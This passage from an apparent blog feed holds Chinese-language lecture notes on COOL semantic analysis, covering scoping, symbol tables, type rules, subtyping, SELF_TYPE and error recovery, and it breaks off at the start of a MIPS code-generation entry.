    <content type="html"><![CDATA[<h2 id="type-checking-rules-and-how-to-implement"><strong>Type CheckingRules and How to Implement ?</strong></h2><p>Cool type can be implemented in a single traversal over the AST</p><ul><li>Type environment is passed down the tree (From parent tochild)，环境自上而下是在不断扩增的</li><li>Types are passed up the tree from (From child toparent)，类型是自底向上推导和检查的</li></ul><p>🌰： <span class="math display">\[\frac{O,M,C\vdash e_1:Int \quad O,M,C\vdash e_2:Int }{O,M,C\vdash e_1 +e_2:Int }\]</span></p><blockquote><p>Environment(Object, Method, Class),环境包括当前对象，当前方法及当前类</p></blockquote><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">TypeCheck(Envirment, e1 + e2) = &#123;<br>T1 = TypeCheck(Envirment, e1)<br>T2 = TypeCheck(Envirment, e2)<br><span class="hljs-built_in">check </span>T1 == T2 == Int<br><span class="hljs-built_in">return </span>Int<br>&#125;<br></code></pre></td></tr></table></figure><p>🌰： <span class="math display">\[\begin{equation}\begin{aligned}\frac{O,M,C\vdash e_0:T_0 \quadO[T/x],M,C\vdash e_1:T_1  \quadT_0 &lt;= T}{O,M,C\vdash e_1 + e_2:Int }\end{aligned}\end{equation}\]</span></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">TypeCheck(Envirment, <span class="hljs-params">let</span> <span class="hljs-params">x</span>: T &lt;- <span class="hljs-params">e0</span> <span class="hljs-params">in</span> <span class="hljs-params">e1</span>)</span> = &#123;<br>T0 = <span class="hljs-constructor">TypeCheck(Envirment, <span class="hljs-params">e0</span>)</span><br>T1 = <span class="hljs-constructor">TypeCheck(Envirment.<span class="hljs-params">add</span>(&#123;<span class="hljs-params">x</span>: T&#125;)</span>, e1)<br>check <span class="hljs-constructor">SubType(T0, T)</span><br>return T1<br>&#125;<br><br>自上而下，environment不断扩增，自底向上检查类型<br></code></pre></td></tr></table></figure><h2 id="introduction-to-semantic-analysis">Introduction to SemanticAnalysis</h2><ul><li><p>Lexical analysis</p><ul><li>Detects inputs with illegal tokens</li></ul></li><li><p>Parsing</p><ul><li>Detects inputs with ill-formed parse trees</li></ul></li><li><p>Semantic analysis</p><ul><li>Last. Front end phase</li><li>Catched all remaining errors</li></ul></li></ul><p>Why do semantic analysis ?</p><ul><li>Parsing can't catch some errors</li><li><strong>Some langaguage constructs not context-free</strong></li></ul><blockquote><p><a href="https://www.zhihu.com/question/21833944">(2 封私信 / 25条消息) 应该如何理解「上下文无关文法」？ - 知乎 (zhihu.com)</a></p></blockquote><p>Semantic analysis will do ?</p><ul><li>All identifiers are declared</li><li>Type checking</li><li>Inheritance relationships checking</li><li>Classes defined ony once</li><li>Methods in a class defined only once</li><li>Reserved identifiers are not misused</li><li>...</li></ul><h2 id="静态作用域">静态作用域</h2><p>Matching static declarations with uses</p><ul><li>Important static analyisis step in most language</li><li>including COOL</li></ul><p>🌰：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">let</span> y: String &lt;- <span class="hljs-string">&quot;abc&quot;</span> <span class="hljs-keyword">in</span> y + <span class="hljs-number">3</span> <span class="hljs-comment">// 在后面的语句里y为string类型</span><br><br><span class="hljs-keyword">let</span> y: <span class="hljs-built_in">Int</span> <span class="hljs-keyword">in</span> x + <span class="hljs-number">3</span> <span class="hljs-comment">// 没有看到x的定义，将会报错</span><br></code></pre></td></tr></table></figure><blockquote><p>The scope of an identifier is the portion of a program in which thatidentifier is accessible</p></blockquote><p>计算机领域里变量作用域指的是程序中变量的起作用(可以get)的一段范围</p><p>不同作用域里可存在同名变量，同一个作用域不可出现不同名变量</p><p>一个变量的作用域范围是有限的</p><p>许多语言都是静态作用域：</p><p>作用域仅仅依赖程序文本，根据变量在程序文本的位置决定变量的作用域，没有任何运行时决定的行为，eg:Cool</p><p>动态作用域：</p><p>Lisp: Lisp has changed to mostly static scoping</p><p>Scope depends on execution of the program</p><p>🌰：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs llvm">let <span class="hljs-keyword">x</span>: Int &lt;- <span class="hljs-number">0</span> in<br>&#123;<br><span class="hljs-keyword">x</span><span class="hljs-comment">; =&gt;&gt;&gt;&gt;&gt;&gt; 1</span><br>let <span class="hljs-keyword">x</span>: Int &lt;- <span class="hljs-number">1</span> in<br><span class="hljs-keyword">x</span><span class="hljs-comment">; =&gt;&gt;&gt;&gt; 2</span><br><span class="hljs-keyword">x</span><span class="hljs-comment">; =&gt;&gt;&gt;&gt;&gt;&gt; 1</span><br>&#125;<br><br>上面<span class="hljs-number">1</span>号<span class="hljs-keyword">x</span>和<span class="hljs-number">2</span>号<span class="hljs-keyword">x</span>是不同的作用域里<span class="hljs-keyword">x</span><br><br>动态作用域里的变量总是指向离它最近的变量<br><br>g(y) <span class="hljs-operator">=</span> let a &lt;- <span class="hljs-number">4</span> in f(<span class="hljs-number">3</span>)<span class="hljs-comment">;</span><br>f(<span class="hljs-keyword">x</span>) <span class="hljs-operator">=</span> a <span class="hljs-operator">=</span>&gt;&gt;&gt;&gt;&gt; a <span class="hljs-operator">=</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>Cool identifier bindings are introduced by:</p><ul><li>Class declarations (introduce class names)</li><li>Method declarations (introduce method names)</li><li>Let declarations (introduce object id's)</li><li>Formal declarations (introduce object id's)</li><li>Attribute declarations (introduce object id's)</li><li>Case declarations (introduce object id's)</li></ul><p>Cool 的标识符并不都是允许嵌套的</p><p>比如类定义不允许嵌套，类名使用前必须定义</p><h2 id="静态作用域实现符号表">静态作用域实现（符号表）</h2><p>Much of semantic analysis can be expressed as a recursive descent ofon an AST</p><ul><li>Before: Process an AST node n</li><li>Recurse: Process the children of n</li><li>After: Finish processing the AST node n</li></ul><p>When performing semantic analysis on a portion of the AST, we need toknow which identifiers are defined</p><p>当在AST的某部分上执行语义分析时，需要知道哪些标识符已经被定义了。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">let</span> x: Int &lt;- <span class="hljs-number">0</span> <span class="hljs-function"><span class="hljs-keyword">in</span> e</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">let</span> <span class="hljs-title">x</span>(<span class="hljs-params">sym</span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">init</span></span> = <span class="hljs-number">0.</span>(sym)     e(sym + x)<br><br>x <span class="hljs-keyword">is</span> defined <span class="hljs-keyword">in</span> subtree e<br></code></pre></td></tr></table></figure><p><code>Recall: let x: Int &lt;- 0 in e</code></p><p>Idea:</p><ul><li>Before processing e, add definition of x to current definitions,overriding any other definition of x</li><li>Recurse</li><li>After processing e, remove definition of x and restore olddefinition of x</li></ul><p>a symbol table is a data structure that tracks the current bindingsof identifiers</p><p>简单的实现可以使用stack</p><ul><li><code>Add_symbol(x)</code></li><li><code>Find_symbol(x) search stack, starting from top fro x, return x or NULL if none found</code></li><li><code>Remove() pop from ths stack</code></li><li><code>exit_scope() exit current scope</code></li><li><code>Check_scope(x) true if x defined in current scope</code></li></ul><p>在COOL里使用stack即可对let声明的变量进行处理</p><p>每次用let声明一个变量，即push入stack，而且也允许嵌套，每次退出当前let范围，即pop出变量；</p><p>但是对于函数确不好使用，比如函数参数，一次有多个参数，并且有重名的参数，所以得一次push多个变量，但是多个变量是在同一个层级里，而stack的解决方案默认一个变量一个层级</p><blockquote><p>class names can be used before being defined in COOL</p><p>solution：two passes to tranversal on AST</p><ul><li>Pass1: Gather all class names</li><li>Pass2: Do the checking</li></ul></blockquote><h2 id="类型">类型</h2><p>什么是类型，不同的语言对于类型定义不同，但通常意义上，一致认为被定义如下：</p><ul><li>一些值的集合（数据）</li><li>可操作这些值的一些操作（算法/函数/方法）</li></ul><p>必须确保在转化为机器语言之前做好类型检查哦，因为机器语言执行指令不会做任何检查。语言类型系统知名里在哪些类型上的哪些操作是合法的。语言的类型检查目的就是确保在正确的类型上执行正确的操作。</p><p>类型检查时期：</p><ul><li>编译时期执行类型检查：C, COOL, Java</li><li>运行时类型检查：程序执行的时候执行类型检查, Python, Lisp, Perl</li><li>无类型检查：machine code</li></ul><p>静态类型检查 vs 动态类型检查</p><ul><li>静态检查可以在编译时期捕获错误</li><li>避免运行时错误</li></ul><p>动态检查：</p><ul><li>静态类型检查是有局限性的，有些语句在静态类型不好检查出来，比如继承的时候，子类调用父类的方法</li></ul><p>现代编程语言很多结合了两者，如：</p><p>C，java可以使用unsafe逃脱静态检查</p><p>People retrofit static typing to dynamically typed languages fordebugging or optimization</p><p>类型检查：验证类型的合法性</p><p>类型推断：自动推断和填充缺失的类型信息</p><p>之前已经见过一些formal notions，比如：</p><ul><li>Regular expressions</li><li>Context-free grammars</li></ul><p>类型检查也有一套标准的逻辑推导规则：</p><p>推导规则具有如下形式：</p><p><em>If Hypothesis is true, then Conclusion is true</em></p><p>类型检查就是通过这样的推理：</p><p><em>If E1 and E2 have certain types, then E3 has a certaintype</em></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">^ =&gt; <span class="hljs-built_in">and</span><br>=&gt; <span class="hljs-built_in">if</span>-then<br><span class="hljs-symbol">x:</span> <span class="hljs-built_in">T</span> =&gt; x has <span class="hljs-built_in">type</span> &#x27;<span class="hljs-built_in">T</span>&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>if e1 has type int and e2 type int, then e1 + e2 has type int=======&gt;</p><p>e1 has type ^ e2 has type int =&gt; e1 + e2 has type int=======&gt;</p><p>(E1: int ^ e2 : int) =&gt; e1 + e2: int</p></blockquote><p>the statement <code>(E1: int ^ e2 : int) =&gt; e1 + e2: int</code> isa special case of<code>hypothesis1 ^ ... ^ hypothesisn =&gt; Conclusion</code></p><p>一般情况下，上面的推导规则写出如下符号形式： <spanclass="math display">\[\frac{\vdash hypothesis1 \vdash hypothesis2 ... \vdashhypothesisn}{\vdash Conslusion}\]</span> <span class="math inline">\(\vdash\)</span> means ''it isprovable that ..."</p><p>看几个简单的推导规则： <span class="math display">\[\frac{i \quad is \quad an \quad interger \quad literal}{\vdash i: int}\]</span></p><p><span class="math display">\[\frac{e1: int \quad e2: int}{\vdash e1 + e2: int}\]</span></p><p>类型检查可以很好的基于AST来做：</p><p>如果已经证明了子表达式的类型，那么父节点的类型也就很好地得到，所以类型检查和推断是自底向上做的</p><h2 id="类型环境">类型环境</h2><p>在类型推导/检查中，有的时候一个变量的类型信息需要更多的信息才能获得该变量的类型，所以在我们的推导规则里需要加入更多的类型信息——类型环境，类型环境给予了自由变量更多的相关类型信息</p><p>类型环境：a fucntion from object identifiers to Types(即标识符到类型的映射)</p><p>自由变量：如果一个表达式里存在一个变量没有被定义，那么该变量就是自由变量</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">let</span> y: <span class="hljs-built_in">int</span> &lt;- <span class="hljs-number">0</span> <span class="hljs-keyword">in</span> x + y<br>这里<span class="hljs-keyword">let</span>限定下，x是未定义的，而y是<span class="hljs-built_in">int</span>类型且初始化为<span class="hljs-number">0</span>，在进行类型检查的时候，我们只有拥有了前面关于x的信息，才能知道x的类型<br></code></pre></td></tr></table></figure><p>let O be function from Object idenfiers to types, notion as follow:<span class="math display">\[O\vdash e: T\]</span> 读作：在环境O下，可以证明e是T类型</p><p>单点修改： <span class="math display">\[\begin{equation}\begin{aligned}\frac{O[T/x]\vdash e_1:int  \quad}{O\vdash e_1 + e_2:Int }\end{aligned}\end{equation}\]</span></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">表示<br>O[T/<span class="hljs-keyword">x</span>](<span class="hljs-keyword">x</span>) <span class="hljs-operator">=</span> int<br>O[T/<span class="hljs-keyword">x</span>](y) <span class="hljs-operator">=</span> y (<span class="hljs-keyword">x</span> !<span class="hljs-operator">=</span> y)<br></code></pre></td></tr></table></figure><p>实际上类型环境O可以由之前的Symbol table实现，因为</p><ul><li>类型环境给予当前作用域内部标识符类型（和作用域类型，只不过作用域是记录标识符）</li><li>类型环境也是自上向下不断扩增和单点修改</li><li>但是类型检查和推断是自底向上的</li></ul><h2 id="subtypings">Subtypings</h2><p>subtypings 主要用于继承类型1判断 <span class="math display">\[\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO[T_0/x]\vdash e_1:T_1  \quad}{O\vdash let \quad x: T_0 = e_0 \quad in \quad e_1: T_1 }\end{aligned}\end{equation}\]</span> 在类上定义关系：&lt;=</p><ul><li>X &lt;= Y</li><li>X &lt;= Y if X inherits from Y</li><li>X &lt;= Z if X &lt;= Y and Y &lt;= Z</li></ul><p><span class="math display">\[\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO[T_0/x]\vdash e_1:T_1  \quadT_0 &lt;= T}{O\vdash let \quad x: T_0 = e_0 \quad in \quad e_1: T_1 }\end{aligned}\end{equation}\]</span></p><p>属性初始化： <span class="math display">\[\begin{equation}\begin{aligned}\frac{O_c(x) = T_0  \quadO_C\vdash e_1:T_1  \quadT_1 &lt;= T0}{O\vdash x: T_0 = e_1 }\end{aligned}\end{equation}\]</span></p><p>考虑 <code>if e0 then e1 else e2 fi</code></p><p>表达式的结果要么e1要么e2，对应的类型要么是e1的类型要么是e2的类型</p><p>那么整个if-else表达式返回什么类型？</p><p>最好的方法是返回e1和e2的最小上界类型（least upper type）</p><p>least upper bound: lub(X, Y)，表示X和Y的最小上界类型，</p><p>if X &lt;= Z ^ Y &lt;= Z: Z is an upper bound</p><p>If X &lt;= Z' ^ Y &lt;= Z', Z &lt;= Z': Z is an upper bound</p><p>COOL里，两个类型的最小上界是它们继承树里最近公共祖先</p><p><span class="math display">\[\begin{equation}\begin{aligned}\frac{O\vdash e_0:Bool  \quadO\vdash e_1:T_1  \quadO\vdash e_1:T_2  \quad}{O\vdash if \quad e_0 \quad then \quad e_1 \quad else \quad e_2 \quadfi \quad fi: lub(T_1, T_2) }\end{aligned}\end{equation}\]</span></p><h2 id="typing-methods">Typing Methods</h2><p><span class="math display">\[dispatch:\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO\vdash e_1:T_1  \quad... \quadO\vdash e_n:T_n  \quad}{O\vdash e_0.f(e_1, ... e_n): ? }\end{aligned}\end{equation}\]</span></p><p>不知道任何关于f的信息，如何知道f的返回值类型？</p><p>In cool, method and object identifiers live in different namespaces</p><ul><li>A method foo and an object foo can coexisted in the same scope</li></ul><p>In the type rules, this is reflected by a seperate mapping M formethod signatures <span class="math display">\[M(C, f) = (T_1, ... T_n, T_{n+1}) means \quad in \quad Class \quad C\quad there \quad is \quad \\ a \quad method \\ f: \quadf(x_1: T_1, ... x_n: T_n): T_{n+1}\]</span></p><p>dispatch <span class="math display">\[dispatch:\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO\vdash e_1:T_1  \quad... \quadO\vdash e_n:T_n  \quadT_i &lt;= T_{i&#39;} 1 &lt;= i &lt;= n \quadM(T_0, f) = (T_{1&#39;}, ... T_{n&#39;}, T_{n+1})}{O\vdash e_0.f(e_1, ... e_n): T_{n+1} }\end{aligned}\end{equation}\]</span></p><p>静态dispatch <span class="math display">\[static dispatch:\begin{equation}\begin{aligned}\frac{O\vdash e_0:T_0  \quadO\vdash e_1:T_1  \quad... \quadO\vdash e_n:T_n  \quadT_0 &lt;= T \quadT_i &lt;= T_{i&#39;} 1 &lt;= i &lt;= n \quadM(T_0, f) = (T_{1&#39;}, ... T_{n&#39;}, T_{n+1})}{O\vdash e_0@T.f(e_1, ... e_n): T_{n+1} }\end{aligned}\end{equation}\]</span> 最终结合方法环境，变量环境和类， <span class="math display">\[\begin{equation}\begin{aligned}\frac{O, M, C\vdash e_1:int  \quadO, M, C\vdash e_2:int  \quad}{O, M, C\vdash e1 + e2: int }\end{aligned}\end{equation}\]</span> 上面的规则仅适用于COOL</p><blockquote><p>General themes:</p><ul><li>Type rules are defined on the structure of expressions</li><li>Types of varaibles are modeled by an environment</li></ul></blockquote><h2 id="static-type-vs-dynamic-type">Static Type vs Dynamic Type</h2><p>静态类型检查：</p><p>可以在编译时期发现一些常见的错误，但是也有一些不是错误的代码被识别出来，报告错误，这个时候需要动态类型检查，但是实际上为了让有些不是错误的代码能够通过静态类型检查，需要一些特殊的方法：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-title">interits</span> <span class="hljs-title">A</span> </span>&#123;&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>x: <span class="hljs-type">A </span>&lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">A</span>; <span class="hljs-comment">// 静态检查可以通过，左右类型一致</span><br>...<br>x &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">V</span>; <span class="hljs-comment">// 静态检查通不过，左右类型不一致</span><br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>理想情况下，对于所有的表达式：dynamic_type(E) &lt;=static_type(E)</p><p>对于任意表达式E，dynamic_type(E) &lt;=static_type(E)，表示表达式E的静态类型检查得到的类型是对应表达式动态检查得到得类型的父类</p><p>All operations that can be used on an object if type C can also beused on an object of type C' &lt;= C</p><ul><li><p>Such as fetching the value of attribute</p></li><li><p>Or invoking a method on the object</p></li><li><p>Subclass only add attributes or methods</p></li><li><p>```</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>  <br><br><br><br>## Self Type<br><br>考虑如下代码：<br><br>```java<br><span class="hljs-keyword">class</span> Count &#123;<br>    i : int &lt;- <span class="hljs-number">0</span>;<br>    inc () : Count &#123;<br>        &#123;<br>            i &lt;- i + <span class="hljs-number">1</span>;<br>            self;<br>        &#125;<br>    &#125;;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>类Count包含一个计数器。</p></li><li><p>inc方法适用于任何子类。</p></li><li><p>考虑Count的子类Stock</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Stock</span> inherits Count &#123; <br>name : String; -- name of item<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    Stock a &lt;- (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Stock</span>).inc();<br>    ... a.name ...<br>&#125;;<br></code></pre></td></tr></table></figure><p>上述用法在已有的类型系统会报错，因为inc返回的类型是Count，但但是赋值的对象是Stock对象</p><ul><li><p>(new Stock).inc()具有动态类型Stock；</p></li><li><p>因此如下语句是合法的;</p><p>Stock a &lt;- (new Stock).inc()；</p></li><li><p>但这不是很好的类型系统，因为(newStock).inc()的静态类型为Count；</p></li><li><p>类型检查器“丢失”类型信息</p><ul><li>这使得继承inc毫无用处 ；</li><li>因此，我们必须为每个子类重新定义inc，并使用专门的返回类型 。</li></ul></li></ul><p>解决上述问题需要引入SELF_TYPE</p><p>我们将使用self type扩展类型系统：</p><ul><li>inc返回self；</li><li>因此，返回值与“self”具有相同的类型；</li><li>可以是Count或Count的任何子类型！</li></ul><p>引入关键字SELF_TYPE以用于此类函数的返回值，SELF_TYPE允许在继承inc时更改inc的返回类型</p><p>修改inc的声明：</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nim">inc(): <span class="hljs-type">SELF_TYPE</span> <span class="hljs-meta">&#123;...&#125;</span><br></code></pre></td></tr></table></figure><p>类型检查系统现在可以证明：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">O</span><span class="hljs-operator">,</span> <span class="hljs-variable">M</span><span class="hljs-operator">,</span> <span class="hljs-built_in">C</span> <span class="hljs-operator">|-</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">new</span> <span class="hljs-built_in">Count</span><span class="hljs-punctuation">)</span><span class="hljs-operator">.</span><span class="hljs-variable">inc</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-operator">:</span> <span class="hljs-built_in">Count</span><br><span class="hljs-built_in">O</span><span class="hljs-operator">,</span> <span class="hljs-variable">M</span><span class="hljs-operator">,</span> <span class="hljs-built_in">C</span> <span class="hljs-operator">|-</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">new</span> <span class="hljs-variable">Stock</span><span class="hljs-punctuation">)</span><span class="hljs-operator">.</span><span class="hljs-variable">inc</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-operator">:</span> <span class="hljs-variable">Stock</span><br></code></pre></td></tr></table></figure><p>注意SELF_TYPE不是动态类型</p><ul><li>它也不是类名；</li><li>它是静态类型；</li><li>帮助类型检查器更好地跟踪类型；</li><li>使类型检查器接受更正确的程序</li></ul><p>简而言之，拥有SELF_TYPE可以提高类型系统的表达能力。</p><p>What can be the dynamic type of the object returned by inc?（inc将返回什么样的动态类型）</p><ul><li>Answer: whatever could be the Count or any subclass of Count of'self'</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">A</span> <span class="hljs-symbol">inherits</span> <span class="hljs-symbol">Count</span> &#123;&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-symbol">B</span> <span class="hljs-symbol">inherits</span> <span class="hljs-symbol">Count</span> &#123;&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-symbol">C</span> <span class="hljs-symbol">inherits</span> <span class="hljs-symbol">Count</span> &#123;&#125;;<br></code></pre></td></tr></table></figure><p>In genreral, if SELF_TYPE appears textually in the class C as thedeclared type of E then</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">dynamic_type</span><span class="hljs-params">(E)</span></span> &lt;= C<br></code></pre></td></tr></table></figure><blockquote><p>Note: The meaning of SELF_TYPE depends on where it appears , <spanclass="math inline">\(SELF\_TYPE_c\)</span> refers to an occurence ofSELF_TYPE in the body of C</p></blockquote><p><span class="math display">\[SELF\_TYPE_c &lt;= C\]</span></p><p>In type checking it is always safe to replace <spanclass="math inline">\(SELF\_TYPE_c\)</span> by C <spanclass="math display">\[SELF\_TYPE_c &lt;= SELF\_TYPE_c\]</span> in cool, we never compare SELF_TYPEs coming from differentclasses <span class="math display">\[SELF\_TYPE_c &lt;= T \quad if \quad C &lt;= T\]</span></p><ul><li><span class="math inline">\(SELF\_TYPE_c\)</span> can be any subtypeof c</li><li>This includes C itself</li><li>Thus this is the moe flexible rule we can allow</li></ul><p>let T and T' be any types but SELF_TYPE</p><ol type="1"><li><span class="math inline">\(lub(SELF\_TYPE_c, SELF\_TYPE_c) =SELF\_TYPE_c\)</span></li><li><span class="math inline">\(lub(SELF\_TYPE_c, T) = lub(C,T)\)</span></li><li><span class="math inline">\(lub(T, SELF\_TYPE_c) = lub(C,T)\)</span></li><li><span class="math inline">\(lub(T, T&#39;) defined asbefore\)</span></li></ol><p><strong>哪里使用SELF_TYPE</strong></p><p><strong>self type checking</strong></p><h2 id="错误恢复">错误恢复</h2><p>与解析一样，从类型错误中恢复也很重要</p><p>目标：</p><ul><li>What type is assigned to an expresson with no legitimate type ?</li><li>This type will influence the typing of the enclosing expression</li></ul><p><strong>方法1：</strong></p><p>assign type Object to ill-typed expressions</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">let y: Int &lt;- x + 2 in y + 2<br><span class="hljs-keyword">error: </span>x is undefind: =&gt; x is Object<br><span class="hljs-keyword">error: </span>+ applied to Object =&gt; x + 2 is Object <br><span class="hljs-keyword">error: </span>bad assimend =&gt; ... (Int and Object is incompatible)<br></code></pre></td></tr></table></figure><p><strong>方法2:</strong></p><p>introduce <code>No_type</code> for use with ill-typed expressions</p><ul><li>DefineNo_type &lt;= C for all types C</li><li>Every operation os defined for No_type<ul><li>With a. No_type result</li></ul></li></ul><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">let</span> y: Int &lt;- x + <span class="hljs-number">2</span> <span class="hljs-keyword">in</span> y + <span class="hljs-number">2</span><br>x <span class="hljs-keyword">is</span> No_type =&gt; x + <span class="hljs-number">2</span> <span class="hljs-keyword">is</span> No_type =&gt; <span class="hljs-literal">no</span> error becuse No_type <span class="hljs-keyword">is</span> subtype <span class="hljs-keyword">of</span> any type<br></code></pre></td></tr></table></figure><p>总结：</p><p>实际编译器也会使用类似No_type的东西</p><p>然而，引入No_type会带来跟多复杂性：类的继承结构将不再是树状，因为每个类都有一个子类</p><blockquote><p>cool里使用了第一种方案</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 7 Cool Gode Generation</title>
    <link href="/emocoder/2023/06/03/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%83/"/>
    <url>/emocoder/2023/06/03/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E4%B8%83/</url>
    
    <content type="html"><![CDATA[<h2 id="代码生成简介">代码生成简介</h2><p>将ast转换为汇编代码，具体这里是mips汇编指令，cool里使用了累加寄存器<code>$a0</code></p><p>堆栈在内存中，，堆栈由高地址像低地址扩增</p><p>堆栈指针：<code>$sp</code> or <code>$29</code></p><p>具体的mips指令可以参考：misp文档</p><p>定义简单函数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> fib(x) = if x = <span class="hljs-number">1</span> then <span class="hljs-number">0</span> else <br> <span class="hljs-attribute">if</span> x = <span class="hljs-number">2</span> then <span class="hljs-number">1</span> else<br> <span class="hljs-attribute">fib</span>(x-<span class="hljs-number">1</span>) + fib(x-<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>对于每一个表达式e，可以生成如下MISP代码：</p><ul><li>Computes the value of e in<code>$a0</code>（计算表达式e的值，并存储在<code>$a0</code>寄存器中）</li><li>Preservers <code>$sp</code> and the contents of stack(维护<code>$sp</code> 指针)</li></ul><p>这样我们可以定义<code>cgen(e)</code>表示为e的代码生成，并在最后将e的值存于<code>$a0</code> 中</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">cgen</span><span class="hljs-params">(i)</span></span> = <span class="hljs-selector-tag">li</span> <span class="hljs-variable">$a0</span> i<br></code></pre></td></tr></table></figure><blockquote><p>代码生成是在编译阶段</p><p>汇编代码的执行是在运行时</p></blockquote><figure class="highlight mipsasm"><table><tr><td 